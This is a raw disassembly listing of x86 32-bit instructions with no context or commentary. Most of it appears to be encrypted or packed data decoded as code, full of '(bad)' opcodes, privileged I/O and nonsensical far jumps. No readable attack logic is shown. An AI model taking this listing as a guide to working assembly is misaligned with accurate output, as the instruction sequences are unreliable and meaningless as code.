  408b05:	xor    esp,ebx
  408b07:	ret    
  408b08:	xor    ebp,DWORD PTR [edi+0x706764c0]
  408b0e:	test   al,0xcd
  408b10:	cdq    
  408b11:	mov    esp,0xd9bcb634
  408b16:	ins    DWORD PTR es:[edi],dx
  408b17:	loope  0x408b46
  408b19:	popf   
  408b1a:	mov    ds:0x2b950e6a,eax
  408b1f:	in     eax,dx
  408b20:	mov    edi,0x18996d65
  408b25:	xor    ebp,DWORD PTR [esi+eiz*2]
  408b28:	jb     0x408b0d
  408b2a:	lea    edi,[esi+ebp*2+0x1c]
  408b2e:	int    0xe6
  408b30:	sub    ebp,DWORD PTR fs:[ebx]
  408b33:	sar    DWORD PTR [ecx+edi*4+0x72],1
  408b37:	jno    0x408b94
  408b39:	repnz repnz inc eax
  408b3c:	fdivr  QWORD PTR ds:0xcd45c9b4
  408b42:	pop    ebp
  408b43:	outs   dx,DWORD PTR ds:[esi]
  408b44:	daa    
  408b45:	sub    edi,esp
  408b47:	repnz mov ecx,0x56b873f7
  408b4d:	mov    dh,0x7
  408b4f:	adc    edx,esp
  408b51:	jle    0x408bc3
  408b53:	pop    ecx
  408b54:	aam    0x95
  408b56:	mov    ds:0xa2eae741,al
  408b5b:	and    edx,DWORD PTR [edx-0x65]
  408b5e:	inc    ebx
  408b5f:	ror    edx,1
  408b61:	mov    dl,0xb5
  408b63:	in     eax,0xb3
  408b65:	add    bh,ch
  408b67:	sbb    bh,BYTE PTR [esi-0x144de708]
  408b6d:	mov    ch,0xdc
  408b6f:	xchg   edx,eax
  408b70:	neg    BYTE PTR [ebx+0x63]
  408b73:	mov    edi,eax
  408b75:	sub    eax,0xf8c36df6
  408b7a:	imul   edi,DWORD PTR [edi],0x61
  408b7d:	or     esi,ecx
  408b7f:	jae    0x408bf5
  408b81:	inc    esi
  408b82:	mov    ch,0x94
  408b84:	bound  ebp,QWORD PTR [edi-0x3735713c]
  408b8a:	cmp    eax,0x8ebb0710
  408b8f:	ins    DWORD PTR es:[edi],dx
  408b90:	jnp    0x408bf2
  408b92:	icebp  
  408b93:	clc    
  408b94:	adc    BYTE PTR [esi],0x52
  408b97:	push   ebp
  408b98:	ins    DWORD PTR es:[edi],dx
  408b99:	push   DWORD PTR [ecx-0x60]
  408b9c:	and    bh,BYTE PTR [ebp+0xa118492]
  408ba2:	push   0xffffff83
  408ba4:	push   0xffffffc2
  408ba6:	pop    esp
  408ba7:	push   ds
  408ba8:	fs jmp 0x408bc8
  408bab:	mov    ds:0xb9aeedff,eax
  408bb0:	mov    ds:0x4bfd020d,al
  408bb5:	jno    0x408bef
  408bb7:	lock inc ebx
  408bb9:	mov    al,ds:0xf827ddfc
  408bbe:	add    DWORD PTR [eax],edx
  408bc0:	pop    edx
  408bc1:	mov    bl,0x6
  408bc3:	ss sti 
  408bc5:	adc    esp,DWORD PTR [ebx]
  408bc7:	xchg   esp,eax
  408bc8:	mov    cl,BYTE PTR [ebx-0x18233d88]
  408bce:	(bad)  
  408bcf:	test   BYTE PTR ds:0xa346659e,0x2c
  408bd6:	inc    eax
  408bd7:	aad    0x14
  408bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bda:	in     al,0x13
  408bdc:	mov    dh,0x6
  408bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bdf:	inc    ebx
  408be0:	mov    DWORD PTR [ebp-0x1e],esi
  408be3:	add    DWORD PTR [ebp+0x4186f516],ebx
  408be9:	sub    ecx,DWORD PTR [edx+0x280b5e47]
  408bef:	and    DWORD PTR [eax],esi
  408bf1:	push   ss
  408bf2:	ins    DWORD PTR es:[edi],dx
  408bf3:	pusha  
  408bf4:	push   edx
  408bf5:	ins    BYTE PTR es:[edi],dx
  408bf6:	jo     0x408b7a
  408bf8:	xor    BYTE PTR [ecx+0x20993393],al
  408bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bff:	push   esp
  408c00:	sahf   
  408c01:	mov    ch,0xe5
  408c03:	not    BYTE PTR [ebx]
  408c05:	jle    0x408be0
  408c07:	shl    DWORD PTR [edx+0x21886718],cl
  408c0d:	shl    BYTE PTR [ecx+0x1e],1
  408c10:	pop    ebx
  408c11:	stos   BYTE PTR es:[edi],al
  408c12:	xor    edi,ebx
  408c14:	inc    ebx
  408c15:	popf   
  408c16:	mov    ebp,0xa6c61dff
  408c1b:	mov    edi,0xa92deeb7
  408c20:	inc    ecx
  408c21:	sub    eax,0x7ded5bdc
  408c26:	(bad)  
  408c27:	pushf  
  408c28:	es int3 
  408c2a:	or     ch,0xa
  408c2d:	mov    dl,0x3c
  408c2f:	cmp    BYTE PTR [esi+0x2a],bl
  408c32:	xlat   BYTE PTR ds:[ebx]
  408c33:	das    
  408c34:	int3   
  408c35:	pop    ebx
  408c36:	cwde   
  408c37:	inc    esi
  408c38:	cld    
  408c39:	xchg   esp,eax
  408c3a:	jb     0x408bf2
  408c3c:	(bad)  
  408c3d:	mov    dl,0x81
  408c3f:	test   DWORD PTR cs:[eax-0x2],esi
  408c43:	mov    ch,0xf5
  408c45:	out    0x51,al
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	(bad)  
  408c70:	fdivr  st,st(7)
  408c72:	(bad)  
  408c73:	mov    ds:0x7070d947,al
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408cd8
  408c7d:	jbe    0x408c38
  408c7f:	sbb    esp,edi
  408c81:	push   ds
  408c82:	ds push 0x1d4e10a7
  408c88:	cmp    BYTE PTR [esp+edi*4-0x6b78fae1],0x2a
  408c90:	xchg   edx,eax
  408c91:	or     DWORD PTR [edi*2-0x2fbce685],esp
  408c98:	sbb    esp,DWORD PTR [esi]
  408c9a:	out    0x7,eax
  408c9c:	mov    esi,0xc511a846
  408ca1:	stos   DWORD PTR es:[edi],eax
  408ca2:	enter  0x1d62,0xc0
  408ca6:	or     DWORD PTR [edx-0x5f],eax
  408ca9:	push   0x9545a527
  408cae:	(bad)  
  408caf:	(bad)  
  408cb0:	xchg   BYTE PTR [eax-0x5e],dh
  408cb3:	adc    ch,dl
  408cb5:	popa   
  408cb6:	pop    esi
  408cb7:	shl    BYTE PTR [eax-0x3b],cl
  408cba:	mov    dh,0x18
  408cbc:	mov    edi,0x328d81d1
  408cc1:	sub    eax,0xd60d5bad
  408cc6:	pusha  
  408cc7:	add    esp,DWORD PTR ds:0xe53b2ce6
  408ccd:	cli    
  408cce:	or     ebp,DWORD PTR [ebp+0x1911e794]
  408cd4:	sub    al,0x5b
  408cd6:	repnz sbb dl,BYTE PTR [edi]
  408cd9:	pop    es
  408cda:	mov    ah,0xc1
  408cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cdd:	dec    ebx
  408cde:	jns    0x408d41
  408ce0:	push   edi
  408ce1:	loopne 0x408c68
  408ce3:	push   edx
  408ce4:	popf   
  408ce5:	jnp    0x408d4e
  408ce7:	sbb    ecx,edi
  408ce9:	pop    ebp
  408cea:	jge    0x408c99
  408cec:	div    BYTE PTR [esi+0x3d]
  408cef:	xchg   edx,eax
  408cf0:	(bad)  
  408cf2:	adc    al,0x50
  408cf4:	gs jne 0x408d46
  408cf7:	loop   0x408cad
  408cf9:	add    edi,ebx
  408cfb:	jl     0x408d03
  408cfd:	cmp    dl,cl
  408cff:	arpl   WORD PTR [eiz*8-0x1eb494aa],di
  408d06:	mov    ds:0x4fd300e,eax
  408d0b:	pop    esi
  408d0c:	or     al,0x2
  408d0e:	retf   0x4719
  408d11:	mov    dh,0xb7
  408d13:	test   DWORD PTR [ecx+0x7dae2568],esi
  408d19:	pop    esp
  408d1a:	cdq    
  408d1b:	and    eax,0x6b5e8aaf
  408d20:	adc    cl,BYTE PTR [ecx-0x10]
  408d23:	sahf   
  408d24:	das    
  408d25:	dec    ecx
  408d26:	ja     0x408cc6
  408d28:	test   BYTE PTR [ecx],0x44
  408d2b:	inc    ecx
  408d2c:	dec    edx
  408d2d:	xor    eax,0x80814e11
  408d32:	aad    0xa3
  408d34:	mov    gs,WORD PTR [edi+ebx*4+0x19173005]
  408d3b:	add    BYTE PTR [edi+ebp*1-0x50cacf2a],bl
  408d42:	ja     0x408da1
  408d44:	inc    ebx
  408d45:	xchg   BYTE PTR [ecx-0xca42208],bh
  408d4b:	xchg   ebx,eax
  408d4c:	jmp    0x408d29
  408d4e:	add    eax,0xa6ef048d
  408d53:	push   edx
  408d54:	dec    ebx
  408d55:	fdiv   st,st(7)
  408d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d58:	and    BYTE PTR [edi],0xf7
  408d5b:	(bad)  
  408d5c:	in     eax,0xf1
  408d5e:	inc    ebx
  408d5f:	popf   
  408d60:	xor    edx,DWORD PTR [ecx+0x61]
  408d63:	push   cs
  408d64:	mov    ds:0x786605c2,eax
  408d69:	cmp    ah,al
  408d6b:	mov    al,ds:0x19362de5
  408d70:	loopne 0x408d65
  408d72:	sub    DWORD PTR [esi],eax
  408d74:	ret    
  408d75:	test   esp,ebx
  408d77:	or     edi,DWORD PTR [ebp+0x21e3620]
  408d7d:	ins    DWORD PTR es:[edi],dx
  408d7e:	dec    esp
  408d7f:	gs sbb eax,0x4039c7c8
  408d85:	pop    si
  408d87:	lds    edi,FWORD PTR [eax-0xa]
  408d8a:	lea    esi,[edx+eax*4]
  408d8d:	lahf   
  408d8e:	imul   ebp,eax,0xaef596c
  408d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d95:	sub    eax,DWORD PTR [edx-0x41]
  408d98:	in     eax,0x30
  408d9a:	jecxz  0x408df2
  408d9c:	mov    ch,0x2d
  408d9e:	test   al,0x22
  408da0:	and    eax,0x93501a5f
  408da5:	add    ecx,DWORD PTR [edx-0x73]
  408da8:	pop    ebp
  408da9:	mov    bh,0x31
  408dab:	(bad)  
  408dad:	int    0x0
  408daf:	sub    cl,BYTE PTR [eax-0x18438c24]
  408db5:	push   ss
  408db6:	ret    
  408db7:	or     al,ch
  408db9:	ror    DWORD PTR [esi-0x69],cl
  408dbc:	aad    0x2a
  408dbe:	lock jb 0x408df0
  408dc1:	ja     0x408d9e
  408dc3:	jmp    0xc89b:0xd777080c
  408dca:	or     esi,ebx
  408dcc:	call   0x9a29:0xe41ae9e1
  408dd3:	jp     0x408da9
  408dd5:	jmp    0x408da6
  408dd7:	enter  0x1227,0x6c
  408ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ddc:	xor    ah,BYTE PTR [edx]
  408dde:	add    ch,BYTE PTR [ebp+0x5b]
  408de1:	xchg   ecx,eax
  408de2:	loope  0x408e55
  408de4:	push   edi
  408de5:	fst    QWORD PTR [ebp-0x137d5f6d]
  408deb:	mov    WORD PTR [edx+eiz*4+0x3dca3e3f],?
  408df2:	in     al,0x86
  408df4:	mov    esp,0x4c235758
  408df9:	adc    ecx,DWORD PTR [ecx]
  408dfb:	mov    cl,0x52
  408dfd:	lds    esi,FWORD PTR [edx+0x298c2446]
  408e03:	lods   eax,DWORD PTR ds:[esi]
  408e04:	dec    ecx
  408e05:	lea    edx,[edx]
  408e07:	add    eax,0x69a8ac77
  408e0c:	(bad)  
  408e0d:	and    ah,ch
  408e0f:	repz jl 0x408e86
  408e12:	xchg   esi,eax
  408e13:	leave  
  408e14:	xchg   esi,eax
  408e15:	out    dx,al
  408e16:	push   ebx
  408e17:	push   ebp
  408e18:	repz fcomp QWORD PTR [edi]
  408e1b:	xchg   ebp,eax
  408e1c:	sbb    esi,esi
  408e1e:	add    eax,0xe0402f59
  408e23:	or     dl,BYTE PTR [edi+0x5b]
  408e26:	in     eax,0x65
  408e28:	lods   al,BYTE PTR ds:[esi]
  408e29:	or     al,0x44
  408e2b:	mov    edx,ebx
  408e2d:	mov    ebp,0xd68d8b96
  408e32:	dec    esp
  408e33:	pop    eax
  408e34:	vorps  ymm0,ymm5,YMMWORD PTR [esi+0x68]
  408e39:	sub    DWORD PTR [esi-0x1d02b884],esi
  408e3f:	cmp    DWORD PTR [eax+edi*8+0x79ff2b74],edi
  408e46:	jmp    0x2eae743e
  408e4b:	xchg   edx,eax
  408e4c:	push   edi
  408e4d:	cs inc ebp
  408e4f:	mov    esi,0x3e8e490e
  408e54:	retf   0x332a
  408e57:	mov    bl,0x57
  408e59:	adc    bx,dx
  408e5c:	call   0xa01f:0x6eafe992
  408e63:	cdq    
  408e64:	sbb    eax,esp
  408e66:	loope  0x408e76
  408e68:	pop    ebx
  408e69:	lds    ebp,FWORD PTR [esi]
  408e6b:	pusha  
  408e6c:	aaa    
  408e6d:	js     0x408eb4
  408e6f:	xchg   edi,eax
  408e70:	push   ebp
  408e71:	xchg   ebp,eax
  408e72:	inc    ebx
  408e73:	cmp    eax,0x31c689fd
  408e78:	pop    esi
  408e79:	pop    ebp
  408e7a:	add    dl,dl
  408e7c:	call   0xf348:0x6080b12b
  408e83:	dec    esp
  408e84:	pop    ss
  408e85:	xchg   ebx,eax
  408e86:	xor    eax,0xc4278df9
  408e8b:	sbb    edi,DWORD PTR [eax+0x7242e4ac]
  408e91:	fs jl  0x408e2a
  408e94:	push   ecx
  408e95:	jmp    0x3ab69073
  408e9a:	pop    esi
  408e9b:	jae    0x408e7b
  408e9d:	out    dx,eax
  408e9e:	test   eax,0xf9d2fd64
  408ea3:	add    BYTE PTR cs:[esi],ah
  408ea6:	ror    BYTE PTR [edx-0x45],0xb7
  408eaa:	mov    dl,0xdb
  408eac:	leave  
  408ead:	push   edi
  408eae:	lock outs dx,DWORD PTR ds:[esi]
  408eb0:	fiadd  WORD PTR [edi]
  408eb2:	sbb    eax,edx
  408eb4:	mov    al,BYTE PTR [ebx-0x3816a637]
  408eba:	mov    edi,0xd91665cb
  408ebf:	or     al,0x5b
  408ec1:	ins    BYTE PTR es:[edi],dx
  408ec2:	add    eax,DWORD PTR [edi]
  408ec4:	jmp    0x408e5d
  408ec6:	cmp    dh,BYTE PTR [edi-0x28]
  408ec9:	sti    
  408eca:	aaa    
  408ecb:	inc    ebx
  408ecc:	cmp    ah,al
  408ece:	xlat   BYTE PTR ds:[ebx]
  408ecf:	mov    ?,WORD PTR [edx+0x42]
  408ed2:	popa   
  408ed3:	retf   0xf1ab
  408ed6:	fld    DWORD PTR [bp+si-0x80]
  408eda:	dec    ebx
  408edb:	dec    ebx
  408edc:	sbb    DWORD PTR [ebp-0x51],esp
  408edf:	ins    DWORD PTR es:[edi],dx
  408ee0:	cmp    eax,0xb1d31c3f
  408ee5:	or     BYTE PTR [edx+edi*4-0x3c5cddea],bh
  408eec:	lea    eax,[esi-0x42]
  408eef:	or     dh,BYTE PTR [edi+0x5027ea13]
  408ef5:	adc    eax,DWORD PTR [esi+0x26a1a19c]
  408efb:	lahf   
  408efc:	push   ss
  408efd:	fdiv   QWORD PTR [ecx+0x2d]
  408f00:	arpl   WORD PTR [edi-0x6dbc297b],di
  408f06:	pop    ss
  408f07:	xor    bl,BYTE PTR [ebx-0x4]
  408f0a:	push   ds
  408f0b:	adc    DWORD PTR [edx-0x1183b186],edx
  408f11:	jo     0x408edf
  408f13:	pop    esi
  408f14:	push   ecx
  408f15:	and    eax,0x73468786
  408f1a:	mov    dh,dl
  408f1c:	in     eax,0xb4
  408f1e:	cwde   
  408f1f:	sbb    al,0x5c
  408f21:	out    0xc0,al
  408f23:	sub    DWORD PTR [ecx],esi
  408f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f26:	xchg   ebx,eax
  408f27:	mov    ch,0xc5
  408f29:	pop    esp
  408f2a:	pusha  
  408f2b:	aas    
  408f2c:	pop    eax
  408f2d:	test   BYTE PTR [edx-0x6861a0cd],bh
  408f33:	lods   eax,DWORD PTR ds:[esi]
  408f34:	pop    edx
  408f35:	inc    ebx
  408f36:	(bad)  [edi-0x997439d]
  408f3c:	das    
  408f3d:	(bad)  
  408f3e:	out    dx,eax
  408f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f40:	imul   edi,ebp,0x70
  408f43:	xlat   BYTE PTR ds:[ebx]
  408f44:	and    eax,0x72fe56eb
  408f49:	push   esp
  408f4a:	cmp    DWORD PTR [edi],edx
  408f4c:	push   ds
  408f4d:	cwde   
  408f4e:	xor    BYTE PTR [esi-0x5d],cl
  408f51:	or     ebp,ebp
  408f53:	jmp    0xc919c2a6
  408f58:	pop    ebx
  408f59:	adc    cl,BYTE PTR [eax+ecx*1-0x19]
  408f5d:	sbb    DWORD PTR [edx+0x74],ebx
  408f60:	mov    esi,0x66893f43
  408f65:	xchg   ebx,eax
  408f66:	fwait
  408f67:	add    dh,BYTE PTR [edi-0x1f69844f]
  408f6d:	fcmovnb st,st(3)
  408f6f:	jge    0x408f18
  408f71:	or     eax,0x5e7f0650
  408f76:	mov    esi,0xa33950bf
  408f7b:	fwait
  408f7c:	adc    al,0x56
  408f7e:	les    eax,FWORD PTR [edx]
  408f80:	inc    eax
  408f81:	out    0xc5,eax
  408f83:	mov    esi,0x6a29f01f
  408f88:	repz and ah,BYTE PTR [edx]
  408f8b:	ja     0x408f0d
  408f8d:	inc    ecx
  408f8e:	mov    ebx,0xbdef719e
  408f93:	fstp   TBYTE PTR [eax+edx*1-0x2f465625]
  408f9a:	pop    ecx
  408f9b:	aaa    
  408f9c:	xor    edi,ecx
  408f9e:	add    DWORD PTR [ebx-0x27],esp
  408fa1:	and    edx,esp
  408fa3:	sbb    DWORD PTR [esi-0x523d68c2],esi
  408fa9:	add    al,0x95
  408fab:	in     eax,0xff
  408fad:	xor    BYTE PTR [ebp+0x41b02c05],cl
  408fb3:	add    cl,ch
  408fb5:	dec    eax
  408fb6:	add    eax,DWORD PTR [eax]
  408fb8:	add    BYTE PTR [esp+edi*2],al
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x4d1937f3
  408fc6:	mov    ebx,0xe6778e9d
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408f54
  408fd2:	lahf   
  408fd3:	out    0x8e,eax
  408fd5:	cs std 
  408fd7:	sbb    DWORD PTR [edi+0x63e005e0],ecx
  408fdd:	jmp    0x33d2970d
  408fe2:	shr    DWORD PTR [eax],cl
  408fe4:	ins    DWORD PTR es:[edi],dx
  408fe5:	mov    cs,ebx
  408fe7:	in     eax,dx
  408fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fe9:	jo     0x408f84
  408feb:	inc    esp
  408fec:	adc    BYTE PTR [esi],ch
  408fee:	sahf   
  408fef:	push   esp
  408ff0:	xor    esi,DWORD PTR [ecx-0x28]
  408ff3:	retf   
  408ff4:	cmc    
  408ff5:	inc    ebx
  408ff6:	call   0x33e61973
  408ffb:	xchg   edx,eax
  408ffc:	xlat   BYTE PTR ds:[ebx]
  408ffd:	and    DWORD PTR [ecx+0x45],edi
  409000:	jle    0x408fd0
  409002:	sahf   
  409003:	push   esp
  409004:	rcl    DWORD PTR [edi],0x82
  409007:	dec    esi
  409008:	xor    ebp,esi
  40900a:	dec    edx
  40900b:	mov    cl,0xc6
  40900d:	icebp  
  40900e:	sbb    edx,DWORD PTR [edx]
  409010:	or     ah,0x9e
  409013:	mov    ebp,0xd57723e7
  409018:	or     edi,DWORD PTR [ebx-0x6d5d7482]
  40901e:	repnz ins DWORD PTR es:[edi],dx
  409020:	and    DWORD PTR ds:0xd3c00fc8,0xffffffcd
  409027:	repz scas eax,DWORD PTR es:[edi]
  409029:	mov    ebx,0x934efbd
  40902e:	adc    al,BYTE PTR [ebp+0x43aa7fdb]
  409034:	mov    DWORD PTR [edx],edi
  409036:	aam    0x82
  409038:	jg     0x409028
  40903a:	mov    ebx,0xc2bf2cbe
  40903f:	dec    esp
  409040:	aad    0x36
  409042:	in     al,0x84
  409044:	or     BYTE PTR [ebp+eiz*8+0x1a],al
  409048:	aam    0x97
  40904a:	cmp    al,0x55
  40904c:	sub    al,0x69
  40904e:	push   ebp
  40904f:	repz mov esp,0x84d6e897
  409055:	faddp  st(3),st
  409057:	arpl   WORD PTR [edx],sp
  409059:	int3   
  40905a:	dec    esi
  40905b:	rol    BYTE PTR [eax+0x1687d72a],0x80
  409062:	arpl   WORD PTR [ebp+edx*8-0x1d],di
  409066:	ficomp DWORD PTR [ecx-0x4f9511b2]
  40906c:	or     eax,0xfa86637
  409072:	jmp    0xc78eef0d
  409077:	and    cl,dl
  409079:	xchg   esp,eax
  40907a:	dec    edi
  40907b:	and    DWORD PTR [ebx],eax
  40907d:	inc    edi
  40907e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40907f:	dec    ecx
  409080:	clc    
  409081:	inc    edi
  409082:	shl    DWORD PTR [esi-0x10a58c6e],0x56
  409089:	add    BYTE PTR [edx-0x7],dl
  40908c:	mov    ah,0x21
  40908e:	aaa    
  40908f:	into   
  409090:	cmp    al,0x85
  409092:	retf   0x2d91
  409095:	repz popf 
  409097:	sub    eax,0x912cffd3
  40909c:	leave  
  40909d:	inc    edi
  40909e:	out    dx,al
  40909f:	es das 
  4090a1:	jmp    0x4090dc
  4090a3:	(bad)  
  4090a4:	mov    eax,ds:0x9e2978b5
  4090a9:	sub    dh,BYTE PTR [ecx+0x60570bd]
  4090af:	xchg   edx,eax
  4090b0:	jo     0x40910d
  4090b2:	xchg   ebp,eax
  4090b3:	scas   eax,DWORD PTR es:[edi]
  4090b4:	out    0x5,al
  4090b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090b7:	dec    eax
  4090b8:	xor    DWORD PTR [ebx+0x30],edi
  4090bb:	xor    dl,BYTE PTR [ecx]
  4090bd:	sub    esi,DWORD PTR [edi]
  4090bf:	mov    edx,DWORD PTR [ebx]
  4090c1:	jbe    0x409094
  4090c3:	mov    WORD PTR [edi],gs
  4090c5:	add    ebx,DWORD PTR ds:0xea08826a
  4090cb:	push   DWORD PTR [esi-0x3eea5e6e]
  4090d1:	ret    0xefcd
  4090d4:	lea    ebp,[ebx]
  4090d6:	jmp    0x409140
  4090d8:	stos   DWORD PTR es:[edi],eax
  4090d9:	into   
  4090da:	sti    
  4090db:	std    
  4090dc:	mov    al,ds:0xb89701b5
  4090e1:	add    BYTE PTR [esi],dh
  4090e3:	add    eax,0xbefef59a
  4090e8:	xor    al,0x3e
  4090ea:	mov    ebp,0xceb44bf2
  4090ef:	je     0x409144
  4090f1:	retf   0xb893
  4090f4:	pushf  
  4090f5:	jge    0x4090bf
  4090f7:	sub    DWORD PTR [ebx+ebx*4],esp
  4090fa:	scas   eax,DWORD PTR es:[edi]
  4090fb:	(bad)  
  4090fc:	cmp    BYTE PTR [edx-0x5d09fbfc],cl
  409102:	or     BYTE PTR [esi],bh
  409104:	iret   
  409105:	outs   dx,DWORD PTR ds:[esi]
  409106:	popf   
  409107:	or     ebx,DWORD PTR [ecx-0x58]
  40910a:	inc    ebx
  40910b:	mov    bh,0xad
  40910d:	aam    0xe5
  40910f:	mov    al,0x12
  409111:	cwde   
  409112:	xor    BYTE PTR [ebx-0x27],cl
  409115:	(bad)  
  409117:	cmp    eax,0x90bce988
  40911c:	jnp    0x409114
  40911e:	out    dx,al
  40911f:	jmp    FWORD PTR [ecx+0x63649ea2]
  409125:	sahf   
  409126:	stos   BYTE PTR es:[edi],al
  409127:	or     dh,BYTE PTR [esi-0x3f050b10]
  40912d:	sbb    DWORD PTR [ebx+edx*2+0x1a475bf2],0x3
  409135:	and    bl,BYTE PTR [ecx+eiz*2-0x6e]
  409139:	mov    dl,ch
  40913b:	mov    al,ds:0xc96767b9
  409140:	rcr    dl,cl
  409142:	jecxz  0x409153
  409144:	jmp    0x6428:0x7036ce03
  40914b:	pop    ecx
  40914c:	mov    ds:0xb6f4300f,al
  409151:	mov    edi,0x986d2d3
  409156:	ins    DWORD PTR es:[edi],dx
  409157:	lods   al,BYTE PTR ds:[esi]
  409158:	xchg   edi,eax
  409159:	loop   0x4090eb
  40915b:	mov    es,WORD PTR [ebp-0x42]
  40915e:	push   eax
  40915f:	mov    ebx,DWORD PTR [ebx]
  409161:	push   ss
  409162:	xchg   BYTE PTR [ecx],bh
  409164:	repnz nop
  409166:	and    BYTE PTR [esi-0x2a],bl
  409169:	aam    0xa5
  40916b:	lahf   
  40916c:	test   eax,0x545635b1
  409171:	ins    BYTE PTR es:[edi],dx
  409172:	mov    DWORD PTR [ebx+0xcf09242],0xdad49b87
  40917c:	and    DWORD PTR [ebx+edi*8+0x5aafbf05],ebx
  409183:	jno    0x4091e6
  409185:	rcr    cl,1
  409187:	shl    BYTE PTR [ecx],0x46
  40918a:	xor    al,0x39
  40918c:	pop    esp
  40918d:	pop    ecx
  40918e:	or     ebx,ebp
  409190:	nop
  409191:	pushf  
  409192:	mov    bl,0xe1
  409194:	push   0xffffff92
  409196:	loopne 0x4091bf
  409198:	jbe    0x4091ac
  40919a:	push   cs
  40919b:	rcl    DWORD PTR [eax+0x1f],1
  40919e:	dec    ebx
  40919f:	inc    esi
  4091a0:	sub    DWORD PTR [eax],0xedf9346a
  4091a6:	mov    ah,0x77
  4091a8:	sbb    cl,BYTE PTR [edx]
  4091aa:	je     0x409147
  4091ac:	jp     0x4091ac
  4091ae:	cmp    al,0x6c
  4091b0:	in     al,0xc3
  4091b2:	imul   ebx,ecx,0xffffff95
  4091b5:	rol    BYTE PTR [edi+ecx*1+0x13e929a3],0x46
  4091bd:	mov    bh,0x27
  4091bf:	icebp  
  4091c0:	stos   BYTE PTR es:[edi],al
  4091c1:	jo     0x4091c3
  4091c3:	into   
  4091c4:	cwde   
  4091c5:	sbb    al,0x1b
  4091c7:	jl     0x40920d
  4091c9:	and    eax,0xdae1052c
  4091ce:	cmp    al,0x37
  4091d0:	push   eax
  4091d1:	stos   BYTE PTR es:[edi],al
  4091d2:	frstor [edx+edx*4]
  4091d5:	dec    BYTE PTR [ebx-0x9eeec22]
  4091db:	xor    al,0x8a
  4091dd:	loope  0x4091b6
  4091df:	sbb    cl,BYTE PTR ds:[edi-0x6f]
  4091e3:	in     al,dx
  4091e4:	jge    0x409181
  4091e6:	xchg   ecx,eax
  4091e7:	pop    es
  4091e8:	and    bl,BYTE PTR ds:0x3a685a5c
  4091ee:	mov    edi,0x134dd99d
  4091f3:	mov    DWORD PTR [esi],esi
  4091f5:	jge    0x409235
  4091f7:	mov    dl,0xb8
  4091f9:	xor    eax,0x17362949
  4091fe:	fmul   DWORD PTR [ebx-0x63eac7e5]
  409204:	inc    ebp
  409205:	not    DWORD PTR [ebx]
  409207:	gs cmc 
  409209:	inc    ebx
  40920a:	and    al,0x9c
  40920c:	(bad)  
  40920d:	mov    edi,0x557d7bb4
  409212:	mov    esi,DWORD PTR [ecx-0x2c]
  409215:	nop
  409216:	leave  
  409217:	cdq    
  409218:	icebp  
  409219:	cs pop ebx
  40921b:	cli    
  40921c:	lahf   
  40921d:	inc    ebx
  40921e:	pop    esp
  40921f:	frstor [esi+0x55d3e5ce]
  409225:	loop   0x4091ed
  409227:	icebp  
  409228:	mov    al,ds:0x39185bb3
  40922d:	jmp    0x409229
  40922f:	imul   edx,edx,0x45a17111
  409235:	pop    esp
  409236:	nop
  409237:	cmp    eax,0x71d0f662
  40923c:	loopne 0x409282
  40923e:	fidivr DWORD PTR [ebp-0x48]
  409241:	push   ds
  409242:	nop
  409243:	push   0xfffffff2
  409245:	dec    eax
  409246:	lea    ecx,[ecx+0x61]
  409249:	dec    esp
  40924a:	add    eax,0xf4237243
  40924f:	outs   dx,DWORD PTR ds:[esi]
  409250:	xchg   edx,eax
  409251:	enter  0xb183,0xe3
  409255:	fcomp  QWORD PTR [ecx+0x6bcc431d]
  40925b:	dec    esp
  40925c:	mov    bl,0xb0
  40925e:	pop    edx
  40925f:	adc    al,0xb2
  409261:	retf   0x68de
  409264:	fild   WORD PTR [ecx-0x7b]
  409267:	push   esi
  409268:	call   0xb1a3:0xf92ae2f2
  40926f:	pop    edx
  409270:	fimul  DWORD PTR [ebx]
  409272:	aas    
  409273:	pop    ss
  409274:	jae    0x409240
  409276:	xor    edi,DWORD PTR [esi-0x748462ae]
  40927c:	jno    0x409263
  40927e:	retf   
  40927f:	dec    edi
  409280:	dec    eax
  409281:	imul   edx,DWORD PTR [edi+0x0],0x19
  409285:	jp     0x40922c
  409287:	iret   
  409288:	mov    bh,0x85
  40928a:	jle    0x409274
  40928c:	call   0x1f7b:0x4b352e50
  409293:	not    ebp
  409295:	aad    0xa7
  409297:	inc    ebx
  409298:	xlat   BYTE PTR ds:[ebx]
  409299:	inc    eax
  40929a:	(bad)  
  40929c:	stos   BYTE PTR es:[edi],al
  40929d:	adc    al,0xe0
  40929f:	mov    dh,0x37
  4092a1:	xchg   BYTE PTR [edi-0x3b],ch
  4092a4:	popf   
  4092a5:	out    dx,eax
  4092a6:	push   ebp
  4092a7:	mov    ecx,0xf305c0fd
  4092ac:	jg     0x409244
  4092ae:	and    al,0x7f
  4092b0:	imul   esp,DWORD PTR [esi+0x56],0x4fd3b4b2
  4092b7:	mov    ds:0xf608286e,al
  4092bc:	jo     0x409291
  4092be:	pop    ds
  4092bf:	aaa    
  4092c0:	jp     0x4092f6
  4092c2:	jg     0x409320
  4092c4:	jg     0x409327
